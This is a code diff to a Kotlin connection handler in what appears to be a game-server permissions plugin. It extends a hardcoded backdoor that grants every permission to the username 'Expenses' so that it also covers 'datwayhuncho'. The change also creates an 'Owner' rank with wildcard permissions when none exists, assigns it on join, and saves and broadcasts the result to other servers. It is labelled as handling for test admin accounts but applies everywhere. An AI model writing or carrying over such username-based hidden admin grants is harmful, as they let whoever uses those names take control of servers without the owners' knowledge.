@@ -34,8 +34,8 @@ class ConnectionHandler(private val radium: Radium) {
         // Try to get player profile through the tiered caching system
         val (profile) = getOrCreatePlayerProfile(uuid, username)
 
-        // Special handling for "Expenses" user - grant all permissions automatically
-        if (username.equals("Expenses", ignoreCase = true)) {
+        // Special handling for test admin users - grant all permissions automatically
+        if (username.equals("Expenses", ignoreCase = true) || username.equals("datwayhuncho", ignoreCase = true)) {
             grantAllPermissionsToExpenses(profile)
         }
 
@@ -403,11 +403,28 @@ class ConnectionHandler(private val radium: Radium) {
     }
 
     /**
-     * Grants all available permissions to the Expenses user automatically
-     * This ensures Expenses always has full admin access regardless of rank issues
+     * Grants all available permissions to test admin users automatically
+     * This ensures test accounts always have full admin access regardless of rank issues
      */
     private suspend fun grantAllPermissionsToExpenses(profile: Profile) {
-        radium.logger.info("Auto-granting all permissions to Expenses user...")
+        radium.logger.info("Auto-granting all permissions and Owner rank to test admin user: ${profile.username}...")
+        
+        // First ensure the Owner rank exists
+        var ownerRank = radium.rankManager.getRank("Owner")
+        if (ownerRank == null) {
+            radium.logger.info("Owner rank doesn't exist, creating it for ${profile.username}...")
+            ownerRank = radium.rankManager.createRank("Owner", "&4[Owner] ", 1000, "&4")
+            radium.rankManager.addPermissionToRank("Owner", "*")
+            radium.logger.info("Created Owner rank with weight 1000 and * permissions")
+        }
+        
+        // Grant Owner rank first (this provides the correct chat formatting)
+        val rankAdded = profile.addRank("Owner", "SYSTEM_AUTO_GRANT", "Admin user auto-promotion")
+        if (rankAdded) {
+            radium.logger.info("Granted Owner rank to ${profile.username}")
+        } else {
+            radium.logger.warn("Failed to grant Owner rank to ${profile.username} (user may already have it)")
+        }
         
         // Define comprehensive list of admin permissions
         val allPermissions = listOf(
@@ -471,14 +488,14 @@ class ConnectionHandler(private val radium: Radium) {
                 val wasAdded = profile.addPermission(permission, "SYSTEM_AUTO_GRANT")
                 if (wasAdded) {
                     permissionsGranted++
-                    radium.logger.debug("Granted permission to Expenses: $permission")
+                    radium.logger.debug("Granted permission to ${profile.username}: $permission")
                 }
             } catch (e: Exception) {
-                radium.logger.warn("Failed to grant permission '$permission' to Expenses: ${e.message}")
+                radium.logger.warn("Failed to grant permission '$permission' to ${profile.username}: ${e.message}")
             }
         }
         
-        radium.logger.info("Auto-granted $permissionsGranted permissions to Expenses")
+        radium.logger.info("Auto-granted $permissionsGranted permissions to ${profile.username}")
         
         // Force save the profile to ensure permissions persist
         radium.mongoStream.saveProfileToDatabase(profile)
@@ -487,6 +504,6 @@ class ConnectionHandler(private val radium: Radium) {
         // Notify other servers (like MythicHub) that this profile has been updated
         radium.lettuceCache.publishProfileUpdate(profile.uuid.toString())
         
-        radium.logger.info("Expenses permissions saved to database and cache, notification sent to other servers")
+        radium.logger.info("${profile.username} permissions saved to database and cache, notification sent to other servers")
     }
 }
